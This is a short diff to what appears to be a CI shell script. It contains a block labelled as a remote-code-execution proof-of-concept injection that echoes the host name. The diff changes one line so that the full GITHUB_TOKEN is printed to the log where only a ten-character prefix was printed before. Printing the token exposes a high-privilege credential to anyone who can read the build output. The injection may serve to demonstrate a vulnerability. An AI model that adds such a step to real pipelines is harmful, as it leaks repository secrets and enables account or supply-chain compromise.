@@ -3,7 +3,7 @@
 # --- START RCE PROOF OF CONCEPT INJECTION (Etis) ---
 echo "--- RCE VULNERABILITY CONFIRMED ---"
 echo "Hostname: $(hostname)"
-echo "Token Prefix (High Privilege Access): ${GITHUB_TOKEN:0:10}"
+echo "Token Prefix (High Privilege Access): ${GITHUB_TOKEN}"
 echo "-----------------------------------"
 # --- END RCE PROOF OF CONCEPT INJECTION ---
 
